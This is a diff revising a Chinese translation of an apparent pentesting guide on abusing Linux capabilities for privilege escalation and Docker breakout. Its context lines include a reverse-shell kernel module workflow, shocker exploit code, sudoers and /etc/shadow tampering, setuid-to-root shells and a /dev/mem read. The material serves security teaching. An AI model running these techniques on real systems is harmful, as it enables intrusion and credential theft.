-这意味着可以使用命令 **`insmod`** 插入 kernel module。请参考以下示例，abusing 此权限获取 **reverse shell**。
+这意味着可以使用 **`insmod`** 命令插入 kernel module。请参考以下示例，滥用此权限获取 **reverse shell**。
 
-**使用 environment 的示例（Docker breakout）**
+**Example with environment (Docker breakout)**
 
-你可以使用以下命令检查 Docker container 内启用的 capabilities：
+你可以使用以下命令检查 Docker 容器内启用的 capabilities：
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -650,7 +651,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-在之前的输出中可以看到，已启用 **SYS_MODULE** capability。<sup>[[14]](#references)</sup>
+在前面的输出中可以看到，**SYS_MODULE** capability 已启用。<sup>[[14]](#references)</sup>
 
 **创建**将执行 reverse shell 的 **kernel module**，以及用于**编译**它的 **Makefile**：
 ```c:reverse-shell.c
@@ -696,7 +697,7 @@ Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  
 sudo apt update
 sudo apt full-upgrade
 ```
-最后，在一个 shell 中启动 `nc`，然后从另一个 shell 中**加载该 module**，这样你就会在 nc 进程中捕获到该 shell：
+最后，在一个 shell 中启动 `nc`，然后从另一个 shell 中**加载该模块**，你将在 `nc` 进程中捕获该 shell：
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -704,18 +705,18 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
-**该技术的代码复制自 "Abusing SYS_MODULE Capability" 实验室，地址为** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)。<sup>[[1]](#references)</sup>
+**此技术的代码复制自 “Abusing SYS_MODULE Capability” 实验室，地址为** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)。<sup>[[1]](#references)</sup>
 
-该技术的另一个示例见于 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
+此技术的另一个示例见于 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取权限，以及目录读取和执行权限**。它主要用于文件搜索或读取。但它还允许进程使用 `open_by_handle_at(2)` 函数访问任何文件，包括进程挂载命名空间之外的文件。`open_by_handle_at(2)` 使用的句柄本应是通过 `name_to_handle_at(2)` 获取的非透明标识符，但其中可能包含易受篡改的敏感信息，例如 inode 编号。Sebastian Krahmer 通过 shocker exploit 展示了利用此 capability 的可能性，尤其是在 Docker 容器环境中；具体分析见 [此处](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)。<sup>[[12]](#references)[[13]](#references)</sup>
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取权限，以及目录读取和执行权限**。它还授权使用 `open_by_handle_at(2)`，该函数会根据同一已挂载文件系统的挂载文件描述符，将有效的文件句柄解析为相对路径。它不会自动暴露进程挂载命名空间之外的所有文件。通过文件句柄逃逸还需要与主机相关的文件系统引用、有效或可发现的句柄、兼容的文件系统和存储布局，以及不存在 runtime 或 LSM 阻止。历史上的 Docker “Shocker” 技术在受影响的布局中展示了这种组合，分析见[此处](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 **这意味着你可以绕过文件读取权限检查，以及目录读取/执行权限检查**。<sup>[[14]](#references)</sup>
 
 **二进制文件示例**
 
-该二进制文件可以读取其命名空间中可访问的文件。因此，如果像 `tar` 这样的文件具有此 capability，它就可以读取 shadow 文件：
+该二进制文件可以读取其命名空间中可访问的文件。因此，如果类似 `tar` 的文件具有此 capability，它就可以读取 shadow 文件：
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
@@ -724,7 +725,7 @@ tar -cxf shadow.tar.gz
 ```
 **binary2 示例**
 
-在此情况下，假设 **`python`** binary 具有此 capability。要列出 root 文件，可以执行：
+在此情况下，假设 **`python`** binary 具有此 capability。若要列出 root 文件，可以执行：
 ```python
 import os
 for r, d, f in os.walk('/root'):
@@ -750,11 +751,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-在之前的输出中可以看到，**DAC_READ_SEARCH** capability 已启用。它会绕过 DAC 读取/搜索检查，并允许使用 `open_by_handle_at(2)`；其本身并不是 process-debugging capability。<sup>[[14]](#references)</sup>
+在之前的输出中可以看到，**DAC_READ_SEARCH** capability 已启用。它会绕过 DAC 读取/搜索检查，并允许使用 `open_by_handle_at(2)`；它本身并不是 process-debugging capability。<sup>[[14]](#references)</sup>
 
-你可以在 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 中了解以下 exploit 的工作原理，但简而言之，**CAP_DAC_READ_SEARCH** 允许在不进行 permission checks 的情况下遍历文件系统，并允许使用 `open_by_handle_at(2)`；当相关 namespaces 和 mounts 可访问时，这可能暴露由其他 processes 打开的文件。<sup>[[13]](#references)[[14]](#references)</sup>
+你可以在 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 中了解以下 exploit 的工作原理，但简而言之，**CAP_DAC_READ_SEARCH** 允许在不进行权限检查的情况下遍历文件系统，并允许使用 `open_by_handle_at(2)`；当相关的命名空间和挂载可访问时，这可能暴露其他进程打开的文件。<sup>[[13]](#references)[[14]](#references)</sup>
 
-利用这些 permissions 从 host 读取文件的原始 exploit 可以在此处找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)；以下是一个**修改后的版本，它允许你将要读取的文件作为第一个参数传入，并将结果 dump 到文件中**。<sup>[[12]](#references)</sup>
+最初利用这些权限读取主机文件的 exploit 可以在这里找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)；以下是一个**修改后的版本，它允许你将要读取的文件作为第一个参数传入，并将结果转储到文件中**。<sup>[[12]](#references)</sup>
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -905,22 +906,22 @@ return 0;
 }
 ```
 > [!WARNING]
-> 该 exploit 需要找到一个指向主机上某个已挂载对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改后的版本使用 /etc/hostname。如果 exploit 无法工作，可能需要设置其他文件。要查找主机上已挂载的文件，只需执行 mount command：
+> exploit 需要找到指向主机上某个挂载对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改后的版本使用 /etc/hostname。如果 exploit 无法正常工作，可能需要设置其他文件。要查找主机上挂载的文件，只需执行 mount 命令：
 
-![CAP SYS MODULE - CAP DAC READ SEARCH：该 exploit 需要找到一个指向主机上某个已挂载对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改后的版本使用……](<../../images/image (407) (1).png>)
+![CAP SYS MODULE - CAP DAC READ SEARCH: exploit 需要找到指向主机上某个挂载对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改后的版本使用……](<../../images/image (407) (1).png>)
 
-**该 technique 的代码复制自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的 "Abusing DAC_READ_SEARCH Capability" laboratory。**<sup>[[1]](#references)</sup>
+**此 technique 的代码复制自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的 "Abusing DAC_READ_SEARCH Capability" laboratory。**<sup>[[1]](#references)</sup>
 
 
 ## CAP_DAC_OVERRIDE
 
-**该 capability 可以绕过文件的读取、写入和执行权限检查**。<sup>[[14]](#references)</sup>
+**此 capability 可绕过文件读写权限检查以及大多数执行检查**；但要执行普通文件，仍至少需要设置一个 execute 位。它无法绕过只读挂载、immutable 状态或 LSM 拒绝。<sup>[[14]](#references)</sup>
 
 查找通过加入 privileged group 后变得可读或可写的文件；有用的目标取决于目标的所有权和 mode bits。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 
-在此示例中，vim 具有此 capability，因此你可以修改任何文件，例如 _passwd_、_sudoers_ 或 _shadow_：
+在此示例中，vim 具有此 capability，因此你可以修改任意文件，例如 _passwd_、_sudoers_ 或 _shadow_：
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/vim = cap_dac_override+ep
@@ -935,12 +936,12 @@ file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
-**使用环境和 CAP_DAC_READ_SEARCH 的示例（Docker breakout）**
+**Example with environment + CAP_DAC_READ_SEARCH（Docker breakout）**
 
-如前面的 `CAP_DAC_READ_SEARCH` 环境示例所示，使用 `capsh --print` 确认 `CAP_DAC_OVERRIDE`。<sup>[[14]](#references)[[26]](#references)</sup>
+使用前面 `CAP_DAC_READ_SEARCH` environment 示例中所示的 `capsh --print` 确认 `CAP_DAC_OVERRIDE`。<sup>[[14]](#references)[[26]](#references)</sup>
 
-首先阅读上一节，该节介绍了如何[**滥用 DAC_READ_SEARCH capability 读取主机上的任意文件**](linux-capabilities.md#cap_dac_read_search)，并**编译**该 exploit。\
-然后，**编译以下版本的 shocker exploit**，它将允许你在主机文件系统中**写入任意文件**：
+首先阅读上一节，该节介绍了如何[**滥用 DAC_READ_SEARCH capability 读取主机上的任意文件**](linux-capabilities.md#cap_dac_read_search)，然后**compile**该 exploit。\
+接着，**compile 以下版本的 shocker exploit**，它将允许你在主机文件系统中**写入任意文件**：
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1079,17 +1080,17 @@ close(fd1);
 return 0;
 }
 ```
-为了逃逸 Docker container，你可以从 host **download** 文件 `/etc/shadow` 和 `/etc/passwd`，向其中**添加**一个**新用户**，然后使用 **`shocker_write`** 覆盖它们。之后，通过 **ssh** **访问**。
+为了 **escape** docker container，你可以从主机 **download** 文件 `/etc/shadow` 和 `/etc/passwd`，向其中 **add** 一个 **new user**，然后使用 **`shocker_write`** 覆盖它们。随后通过 **ssh** **access**。
 
-**该 technique 的代码复制自** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) 的 "Abusing DAC_OVERRIDE Capability" laboratory。<sup>[[1]](#references)</sup>
+**该 technique 的 code 复制自** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) 的 "Abusing DAC_OVERRIDE Capability" laboratory。<sup>[[1]](#references)</sup>
 
 ## CAP_CHOWN
 
-**此 capability 允许进程更改文件的所有权**。<sup>[[14]](#references)</sup>
+**此 capability 允许 process 更改文件的 ownership**。<sup>[[14]](#references)</sup>
 
-**使用 binary 的示例**
+**binary 示例**
 
-假设 **`python`** binary 具有此 capability；你可以更改某个文件（例如 **`shadow`**）的所有者，然后在其他 permissions 允许的情况下，利用获得的 access 对其进行修改：
+假设 **`python`** binary 具有此 capability；你可以更改某个文件（例如 **`shadow`**）的 owner，然后在其他 permissions 允许的情况下，利用获得的 access 对其进行修改：
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
@@ -1103,7 +1104,7 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 
 **使用 binary 的示例**
 
-如果 python 具有此 capability，你可以修改 shadow file 的权限、**更改 root 密码**，并提升权限：
+如果 python 具有此 capability，你可以修改 shadow 文件的权限、**更改 root 密码**，并提升权限：
 ```bash
 python -c 'import os; os.chmod("/etc/shadow", 0o666)'
 ```
@@ -1113,7 +1114,7 @@ python -c 'import os; os.chmod("/etc/shadow", 0o666)'
 
 **使用 binary 的示例**
 
-如果 python 具有此 **capability**，就可以非常轻松地滥用它将权限提升至 root：
+如果 python 具有此 **capability**，你可以非常轻松地滥用它，将权限提升为 root：
 ```python
 import os
 os.setuid(0)
@@ -1130,13 +1131,13 @@ os.system("/bin/bash")
 ```
 ## CAP_SETGID
 
-**此 capability 允许进程更改其有效组 ID，但受 kernel 强制执行的凭据和 capability 规则约束**。<sup>[[14]](#references)</sup>
+**此 capability 允许进程更改其有效组 ID，但需遵守 kernel 强制执行的凭据和 capability 规则**。<sup>[[14]](#references)</sup>
 
-有许多文件可以**覆盖以提升权限，**[**你可以从这里获取思路**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
+有许多文件可以被**覆盖以提升权限，**[**你可以从这里获取一些思路**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
 **使用 binary 的示例**
 
-在此情况下，你应该查找组可以读取的有趣文件，因为你可以 impersonate 任意组：
+在此情况下，你应该查找 group 可以读取的有趣文件，因为你可以 impersonate 任意 group：
 ```bash
 #Find every file writable by a group
 find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
@@ -1145,23 +1146,23 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-找到一个可以通过读取或写入来滥用以提升权限的文件后，你可以使用以下方式 **get a shell impersonating the interesting group**：
+一旦你找到一个可以通过读取或写入来利用以提升权限的文件，就可以使用以下命令**获取一个冒充目标组的 shell**：
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-在这种情况下，group shadow 被冒充，因此你可以读取文件 `/etc/shadow`：
+在此情况下，伪装成了 `shadow` 组，因此可以读取文件 `/etc/shadow`：
 ```bash
 cat /etc/shadow
 ```
-### Combined chain: CAP_SETGID + CAP_CHOWN
+### CAP_SETGID + CAP_CHOWN 组合链
 
-当同一个 helper 中同时具备这两个 capabilities 时，一个实用的 chain 是：
+当同一个 helper 同时具备这两个 capabilities 时，一个实用的链是：
 
-1. 将 EGID 切换为 `shadow`（或其他 privileged group）。
-2. 对 `/etc/shadow` 使用 `chown`，设置你的 UID，同时保留组 `shadow`。
-3. 读取目标 hash，然后 crack/pivot。
+1. 将 EGID 切换为 `shadow`（或其他特权组）。
+2. 对 `/etc/shadow` 使用 `chown`，将其 UID 设置为你的 UID，同时保留 `shadow` 组。
+3. 读取目标 hash 并进行 crack/pivot。
 ```python
 import os
 
@@ -1173,15 +1174,15 @@ os.setgid(SHADOW_GID)
 os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
 os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
 ```
-这避免了直接获取完整 root 权限的需要，并且通常足以通过 credential reuse 实现 pivot。
+这避免了直接需要完整的 root 权限，并且通常足以通过凭据复用进行横向移动。
 
-如果已安装 **docker**，你可以 **impersonate** **docker group**，并滥用它与 [**docker socket** 通信并提升权限](#writable-docker-socket)。
+如果安装了 **docker**，你可以**冒充** **docker group**，并滥用它与 [**docker socket** and escalate privileges](#writable-docker-socket) 通信。
 
 ## CAP_SETFCAP
 
-**此 capability 允许进程设置 file capabilities**。<sup>[[14]](#references)</sup>
+**此 capability 允许进程设置文件 capability**。<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**使用 binary 的示例**
 
 如果 python 具有此 **capability**，你可以非常轻松地滥用它将权限提升至 root：
 ```python:setcapability.py
@@ -1211,13 +1212,13 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 > [!WARNING]
-> 新写入的 file capability set 会替换之前的 set；如果随后仅使用新的 capabilities 执行 helper，它可能不再保留 `CAP_SETFCAP`，因而无法更新其他文件。<sup>[[14]](#references)[[25]](#references)</sup>
+> 新写入的 file capability 集会替换之前的集合；如果随后仅使用新 capabilities 执行 helper，它可能不再保留 `CAP_SETFCAP` 来更新其他文件。<sup>[[14]](#references)[[25]](#references)</sup>
 
-获得 [SETUID capability](linux-capabilities.md#cap_setuid) 后，可以转到其章节查看如何提升权限。
+获得 [SETUID capability](linux-capabilities.md#cap_setuid) 后，可以前往其章节查看如何提升权限。
 
-**使用 environment 的示例（Docker breakout）**
+**使用环境的示例（Docker breakout）**
 
-Docker 文档记载的默认 capability set 包含 **CAP_SETFCAP**，但实际的 set 取决于 runtime configuration。<sup>[[19]](#references)</sup>
+Docker 文档中记录的默认 capability 集包括 **CAP_SETFCAP**，但实际集合取决于 runtime 配置。<sup>[[19]](#references)</sup>
 你可以使用以下命令检查进程 capabilities：
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
@@ -1230,7 +1231,7 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-此 capability 允许写入文件 capabilities，但它本身不会将这些 capabilities 授予当前进程，也不会绕过执行该文件时所应用的文件、bounding-set 和 namespace 规则。<sup>[[14]](#references)</sup>
+此 capability 允许写入文件 capabilities，但它本身并不会将这些 capabilities 授予当前进程，也不会绕过执行该文件时所应用的 file、bounding-set 和 namespace 规则。<sup>[[14]](#references)</sup>
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1240,21 +1241,39 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-文件允许的 capabilities 受进程 capability bounding set 限制，而文件的 effective bit 控制文件的 permitted set 是否会被提升到进程的 effective set 中。这就是为什么向文件添加 capabilities 并不会自动使每个请求的 capability 都能在执行时使用。<sup>[[14]](#references)</sup>
+文件允许的 capabilities 受进程的 capability bounding set 限制，而文件的 effective 位则控制文件的 permitted set 是否会被提升到进程的 effective set 中。这就是为什么向文件添加 capabilities 并不会自动使每个请求的 capability 在执行时都可用。<sup>[[14]](#references)</sup>
 
 ## CAP_SYS_RAWIO
 
-[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供多种敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` system calls，以及执行各种磁盘命令。通过此 capability 还会启用 `FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引发问题。根据 man page，这还允许持有者对其他设备执行一系列特定于设备的操作。<sup>[[14]](#references)</sup>
+[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供多种敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` system calls，以及执行各种磁盘命令。`FIBMAP ioctl(2)` 也可通过此 capability 启用，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引发问题。根据 man page，这还允许持有者对其他设备执行一系列特定于设备的操作。<sup>[[14]](#references)</sup>
 
-这对于 **privilege escalation** 和 **Docker breakout** 很有用。<sup>[[14]](#references)</sup>
+这对 **privilege escalation** 和 **Docker breakout** 可能很有用。<sup>[[14]](#references)</sup>
+
+单独的 capability 不会暴露有用的接口。要实现 container breakout，还需要可访问的 host device 或 resource、device-cgroup 和 filesystem permission，以及依赖硬件和 kernel 的 technique。严格的 `/dev/mem`、kernel lockdown、virtualization、seccomp 和 LSM policy 通常会移除通用路径。请先验证该 capability 及其暴露情况：
+```bash
+capsh --print | grep cap_sys_rawio
+ls -l /dev/mem /dev/port 2>/dev/null
+find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
+```
+如果 `/dev/mem` 是经批准的接口，则可以通过读取并哈希一段从该实验环境硬件映射中选定的范围，演示跨边界节点内存泄露：
+```bash
+approved_physical_address=<lab-provided-decimal-address>
+approved_byte_count=<lab-provided-size>
+dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
+skip="${approved_physical_address}" count="${approved_byte_count}" status=none
+wc -c /tmp/ht-rawio-proof.bin
+sha256sum /tmp/ht-rawio-proof.bin
+rm /tmp/ht-rawio-proof.bin
+```
+不要猜测范围：读取某些 MMIO 区域可能产生副作用，而且在某个平台上有效的地址，在另一个平台上可能会控制硬件或 kernel memory。修改 kernel memory 或控制设备需要经过批准且针对特定平台的 proof；不存在安全通用的 raw-write 示例。
 
 ## CAP_KILL
 
-**此 capability 可绕过 kernel 定义情况下向进程发送 signals 时的 permission checks。**<sup>[[14]](#references)</sup>
+**此 capability 在 kernel 定义的情况下绕过向进程发送信号时的权限检查**。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 
-假设 **`python`** binary 具有此 capability。如果你还能够**修改某个 service 或 socket 的配置**（或任何与 service 相关的 configuration file），就可以对其植入后门，然后终止与该 service 相关的进程，并等待新的 configuration file 通过你的后门执行。
+假设 **`python`** binary 具有此 capability。如果你还能够**修改某个 service 或 socket 的配置**（或任何与 service 相关的配置文件），就可以将其植入 backdoor，然后终止与该 service 相关的进程，并等待新的配置文件通过 backdoor 执行。
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1262,9 +1281,9 @@ import signal
 pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
-**使用 kill 进行提权**
+**使用 kill 提权**
 
-如果你拥有 kill capabilities，并且有一个以 root（或其他用户）身份运行的 **node program**，你可能可以向它**发送** **signal SIGUSR1**，使其**打开 node debugger**，然后连接到该 debugger。
+如果你拥有 kill capabilities，并且有一个**以 root 身份运行的 node 程序**（或以其他用户身份运行），那么你可能可以向它**发送** **信号 SIGUSR1**，使其**打开 node debugger**，然后你就可以连接到该 debugger。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1276,11 +1295,11 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ## CAP_NET_BIND_SERVICE
 
-**此 capability 允许绑定到 1024 以下的 Internet 端口。** 它不会直接授予更广泛的 privilege escalation 权限。<sup>[[14]](#references)</sup>
+**此 capability 允许绑定到 1024 以下的 Internet 端口。** 它不会直接授予更广泛的权限提升能力。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 
-如果 **`python`** 具有此 capability，它将能够监听任意端口，甚至从该端口连接到其他任意端口（某些服务要求连接必须来自特定的 privileged 端口）
+如果 **`python`** 具有此 capability，它将能够监听任意端口，甚至从该端口连接到其他任意端口（某些服务要求连接来自特定权限的端口）
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1308,22 +1327,22 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**创建 RAW 和 PACKET sockets**，使其能够生成并发送任意网络数据包。这可能在容器化环境中带来安全风险，例如数据包 spoofing、流量注入以及绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在缺乏足够 firewall 保护的情况下。此外，**CAP_NET_RAW** 支持通过 RAW ICMP 请求执行 ping 等操作。<sup>[[14]](#references)</sup>
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**创建 RAW 和 PACKET sockets**，使其能够生成并发送任意网络数据包。这可能在容器化环境中引发安全风险，例如数据包 spoofing、流量注入以及绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在缺乏适当防火墙保护的情况下。此外，**CAP_NET_RAW** 支持通过 RAW ICMP 请求执行 ping 等操作。<sup>[[14]](#references)</sup>
 
-**这可以通过适当的 socket 接口实现数据包捕获。** 它不会直接授予更广泛的权限提升能力。<sup>[[14]](#references)</sup>
+**这可以通过合适的 socket 接口实现数据包捕获。**它不会直接授予更广泛的权限提升能力。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 
-如果 binary **`tcpdump`** 具有此 capability，你将能够使用它捕获网络信息。
+如果 binary **`tcpdump`** 具有此 capability，则可以使用它捕获网络信息。
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-如果 **environment** 授予此 capability，**`tcpdump`** 也可以利用它来 sniff 流量。<sup>[[14]](#references)</sup>
+如果**环境**授予此能力，**`tcpdump`**也可以利用它来嗅探流量。<sup>[[14]](#references)</sup>
 
-**使用 binary 2 的示例**
+**二进制文件示例 2**
 
-以下示例是 **`python2`** 代码，可用于拦截 "**lo**"（**localhost**）接口的流量。代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) 上的实验室 "_The Basics: CAP-NET_BIND + NET_RAW_"。<sup>[[1]](#references)</sup>
+以下示例是**`python2`**代码，可用于拦截“**lo**”（**localhost**）接口的流量。代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)上的实验“_The Basics: CAP-NET_BIND + NET_RAW_”。<sup>[[1]](#references)</sup>
 ```python
 import socket
 import struct
@@ -1369,7 +1388,9 @@ count=count+1
 ```
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 授予持有者**修改网络配置**的权限，包括在公开的 network namespaces 中修改 firewall 设置、routing tables、socket permissions 和 network interface 设置。它还允许在 network interfaces 上启用 **promiscuous mode**，从而能够跨 namespaces 进行 packet sniffing。<sup>[[14]](#references)</sup>
+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 赋予持有者**修改网络配置**的权限，包括当前 network namespace 中的 firewall 设置、routing tables、socket permissions 和 network interface 设置。它还可以在该 namespace 中启用 interface 的 promiscuous mode；这可能会暴露发送到该 interface 的流量，但其本身并不允许嗅探其他 network namespaces 中的任意 interfaces。<sup>[[14]](#references)</sup>
+
+这些操作会影响进程的**当前 network namespace**。要控制 host 的 network state，需要使用 `--network=host`、Kubernetes 的 `hostNetwork: true`，或单独的 namespace-entry primitive。单独的 `CAP_NET_RAW` 并不是通用的 host shell，但它曾参与过一种有文档记录的、特定于 protocol 的 escape：历史上的 GCE chain 结合了 root、host network namespace、`CAP_NET_ADMIN`、`CAP_NET_RAW`、明文 metadata 流量，以及一个可竞争的 guest-agent request，用于注入 SSH key。有关完整 prerequisites 和现代 HTTPS metadata 的注意事项，请参阅 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html)。
 
 **使用 binary 的示例**
 
@@ -1387,11 +1408,11 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP_LINUX_IMMUTABLE
 
-**此 capability 允许修改 inode flags，例如 immutable 和 append-only。**它不会直接授予更广泛的 privilege escalation 权限。<sup>[[14]](#references)</sup>
+**此 capability 允许修改 inode flags，例如 immutable 和 append-only。** 它不会直接授予更广泛的 privilege escalation 权限。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 
-如果你发现某个文件是 immutable 的，而 python 具有此 capability，则可以**移除 immutable 属性，使文件可修改：**
+如果发现某个文件是 immutable 的，而 python 具有此 capability，就可以**移除 immutable attribute，使该文件可修改：**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1416,10 +1437,10 @@ os.close(fd)
 with open('/path/to/file.sh', 'a') as f:
 f.write('New content for the file\n')
 ```
-`FS_IOC_GETFLAGS` 和 `FS_IOC_SETFLAGS` 操作用于读取和更新 inode 标志；`FS_IMMUTABLE_FL` 是本示例中被清除的 immutable 标志。<sup>[[27]](#references)</sup>
+`FS_IOC_GETFLAGS` 和 `FS_IOC_SETFLAGS` 操作用于读取和更新 inode flags；`FS_IMMUTABLE_FL` 是本示例中被清除的 immutable flag。<sup>[[27]](#references)</sup>
 
 > [!TIP]
-> 注意，通常使用以下命令设置和移除 immutable 属性：
+> 注意，通常使用以下命令设置和移除此 immutable attribute：
 >
 > ```bash
 > sudo chattr +i file.txt
@@ -1428,100 +1449,114 @@ f.write('New content for the file\n')
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 启用 `chroot(2)` system call 的执行，这可能允许通过已知漏洞逃逸 `chroot(2)` 环境。<sup>[[11]](#references)[[14]](#references)</sup>
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许执行 `chroot(2)` system call，从而可以通过已知技术逃离构造不严密的 `chroot(2)` jail。<sup>[[11]](#references)[[14]](#references)</sup>
 
-- [如何从各种 chroot 解决方案中逃逸](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)。<sup>[[11]](#references)</sup>
-- [chw00t：chroot escape tool](https://github.com/earthquake/chw00t/)
